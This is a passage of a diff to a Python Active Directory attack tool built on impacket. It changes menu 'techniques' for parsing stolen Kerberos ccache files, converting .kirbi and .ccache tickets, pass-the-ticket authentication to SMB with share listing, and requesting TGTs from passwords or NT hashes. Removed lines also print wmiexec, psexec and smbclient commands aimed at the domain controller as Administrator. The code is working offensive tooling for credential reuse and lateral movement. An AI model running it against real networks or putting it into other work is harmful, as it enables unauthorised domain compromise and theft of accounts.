             os.path.join(ccache_dir, "*.ccache"),
@@ -924,6 +1484,14 @@ def technique_parse_ccache(domain):
     print(f"\n  {G}[+] Found {len(files)} ccache file(s){RS}\n")
     all_tickets = []
 
+    try:
+        from impacket.krb5.ccache import CCache
+        from impacket.krb5.types import KerberosTime
+    except ImportError as ie:
+        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        print(f"  {Y}    Install: pip install impacket{RS}")
+        return
+
     for filepath in files:
         print(f"  {W}{BO}[ {filepath} ]{RS}")
         try:
@@ -937,9 +1505,9 @@ def technique_parse_ccache(domain):
         except:
             print(f"  {C}  Owner: (unknown){RS}")
 
-        print(f"  {'─'*55}")
+        print(f"  {'-'*55}")
         print(f"  {'SERVICE':<40} {'EXPIRES':<20} TYPE")
-        print(f"  {'─'*55}")
+        print(f"  {'-'*55}")
 
         for cred in cc.credentials:
             try:
@@ -976,28 +1544,18 @@ def technique_parse_ccache(domain):
     print(f"  {G}{BO}Summary: {len(tgts)} TGT(s) | {len(all_tickets)-len(tgts)} TGS(s){RS}")
 
     if tgts:
-        dc_fqdn = f"CS-DC01.{domain}"
+        dc_fqdn = f"DC01.{domain}"
         print(f"\n  {C}Use a TGT:{RS}")
         for t in tgts[:2]:
             print(f"  {W}  export KRB5CCNAME={t['file']}{RS}")
-            print(f"  {W}  python3 wmiexec.py -k -no-pass {domain}/Administrator@{dc_fqdn}{RS}")
 
 
 def technique_convert():
-    if not IMPACKET_AVAILABLE:
-        print(f"{R}[!] Impacket not available.{RS}")
-        return
-
     print(f"\n{C}{BO}[ TECHNIQUE 9c: Ticket Format Conversion ]{RS}")
-    print(f"  {Y}  .kirbi = Windows (Mimikatz/Rubeus){RS}")
     print(f"  {Y}  .ccache = Linux (impacket){RS}\n")
 
-    input_file  = safe_input(f"  {W}Input file  (.kirbi or .ccache): {RS}")
-    if input_file is None:
-        return
-    output_file = safe_input(f"  {W}Output file (.ccache or .kirbi): {RS}")
-    if output_file is None:
-        return
+    input_file  = safe_input(C + "[?] Input file (.kirbi/.ccache): " + RS)
+    output_file = safe_input(C + "[?] Output file (.ccache/.kirbi): " + RS)
 
     if not os.path.exists(input_file):
         print(f"  {R}[!] File not found: {input_file}{RS}")
@@ -1006,12 +1564,18 @@ def technique_convert():
     ext_in  = input_file.lower().split('.')[-1]
     ext_out = output_file.lower().split('.')[-1]
 
+    try:
+        from impacket.krb5.ccache import CCache
+    except ImportError as ie:
+        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        print(f"  {Y}    Install: pip install impacket{RS}")
+        return
+
     if ext_in in ('kirbi', 'bin') and ext_out == 'ccache':
         try:
             with open(input_file, 'rb') as f:
                 data = f.read()
             try:
-                import base64
                 data = base64.b64decode(data)
                 print(f"  {Y}  (base64 decoded){RS}")
             except:
@@ -1026,14 +1590,12 @@ def technique_convert():
 
     elif ext_in == 'ccache' and ext_out in ('kirbi', 'bin'):
         try:
-            import base64
             cc    = CCache.loadFile(input_file)
             kirbi = cc.toKirbi()
             with open(output_file, 'wb') as f:
                 f.write(kirbi)
             b64 = base64.b64encode(kirbi).decode()
             print(f"  {G}[+] Saved: {output_file}{RS}")
-            print(f"  {C}Base64 for Rubeus:{RS}")
             print(f"  {Y}  {b64[:80]}...{RS}")
         except Exception as e:
             print(f"  {R}[!] Failed: {e}{RS}")
@@ -1043,19 +1605,13 @@ def technique_convert():
 
 
 def technique_ptt(target, domain):
-    if not IMPACKET_AVAILABLE:
-        print(f"{R}[!] Impacket not available.{RS}")
-        return
-
     print(f"\n{C}{BO}[ TECHNIQUE 9d: Pass-the-Ticket ]{RS}")
 
-    ccache_file = safe_input(f"  {W}.ccache file path: {RS}")
-    if ccache_file is None:
-        return
-    username    = safe_input(f"  {W}Username {C}[Administrator]{W}: {RS}")
-    if username is None:
-        return
-    username = username or "Administrator"
+    ccache_file = safe_input(C + "[?] .ccache file path    : " + RS)
+    username    = safe_input(
+        C + "[?] Username             : " + RS,
+        allow_empty=True
+    ) or "Administrator"
 
     if not os.path.exists(ccache_file):
         print(f"  {R}[!] File not found: {ccache_file}{RS}")
@@ -1063,12 +1619,17 @@ def technique_ptt(target, domain):
 
     print(f"\n  {B}[*] Inspecting ticket...{RS}")
     try:
+        from impacket.krb5.ccache import CCache
         cc = CCache.loadFile(ccache_file)
         for cred in cc.credentials:
             try:
                 print(f"  {G}  ✓ {cred['server'].prettyPrint()}{RS}")
             except:
                 pass
+    except ImportError as ie:
+        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        print(f"  {Y}    Install: pip install impacket{RS}")
+        return
     except Exception as e:
         print(f"  {R}[!] Failed to read: {e}{RS}")
         return
@@ -1078,6 +1639,7 @@ def technique_ptt(target, domain):
 
     print(f"\n  {B}[*] Testing SMB with ticket...{RS}")
     try:
+        from impacket.smbconnection import SMBConnection
         smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
         smb_conn.kerberosLogin(username, "", domain, "", "", "", kdcHost=target)
         print(f"  {G}[+] SMB authenticated via Kerberos!{RS}")
@@ -1085,23 +1647,19 @@ def technique_ptt(target, domain):
         for s in shares:
             print(f"    {W}  {s['shi1_netname'][:-1]}{RS}")
         smb_conn.close()
+    except ImportError as ie:
+        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        print(f"  {Y}    Install: pip install impacket{RS}")
     except Exception as e:
         print(f"  {R}[!] SMB failed: {e}{RS}")
         print(f"  {Y}    Use FQDN not IP for Kerberos auth{RS}")
 
-    dc_fqdn = f"CS-DC01.{domain}"
+    dc_fqdn = f"DC01.{domain}"
     print(f"\n  {C}Commands to use this ticket:{RS}")
     print(f"  {W}  export KRB5CCNAME={ccache_file}{RS}")
-    print(f"  {W}  python3 wmiexec.py   -k -no-pass {domain}/{username}@{dc_fqdn}{RS}")
-    print(f"  {W}  python3 smbclient.py -k -no-pass {domain}/{username}@{dc_fqdn}{RS}")
-    print(f"  {W}  python3 psexec.py    -k -no-pass {domain}/{username}@{dc_fqdn}{RS}")
 
 
 def technique_request(target, domain):
-    if not IMPACKET_AVAILABLE:
-        print(f"{R}[!] Impacket not available.{RS}")
-        return
-
     print(f"\n{C}{BO}[ TECHNIQUE 9e: Request Fresh Ticket ]{RS}")
 
     creds = get_creds()
@@ -1109,11 +1667,23 @@ def technique_request(target, domain):
         return
     username, password, nt_hash, ccache = creds
 
-    spn = safe_input(f"  {W}Target SPN (optional, press Enter to skip): {RS}")
-    if spn is None:
+    spn = safe_input(
+        C + "[?] Target SPN (optional): " + RS,
+        allow_empty=True
+    )
+
+    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
+
+    try:
+        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+        from impacket.krb5.types import Principal
+        from impacket.krb5 import constants
+        from impacket.krb5.ccache import CCache
+    except ImportError as ie:
+        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        print(f"  {Y}    Install: pip install impacket{RS}")
         return
 
-    lm_hash        = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
     user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
     print(f"\n  {B}[*] Requesting TGT for {username}@{domain.upper()}...{RS}")
@@ -1174,6 +1744,8 @@ def technique_request(target, domain):
 # MAIN
 # ─────────────────────────────────────────────────────────────────────────────
 def main():
+    banner()
+
     try:
         dc_ip, domain = get_config()
         if dc_ip is None or domain is None:
@@ -1185,8 +1757,6 @@ def main():
                 break
 
             choice = show_menu()
-            if choice is None:
-                continue
 
             if choice == "0":
                 print(f"\n  {Y}Bye!{RS}\n")
@@ -1216,11 +1786,9 @@ def main():
                 technique_claimspecial(dc_ip, domain, username, password, nt_hash)
             elif choice == "9":
                 technique_kerberos_menu(dc_ip, domain)
-            else:
-                print(f"  {R}Invalid choice{RS}")
 
             try:
-                safe_input(f"\n  {Y}Press Enter to return to menu...{RS}")
+                input(f"\n  {Y}Press Enter to return to menu...{RS}")
             except:
                 pass
 
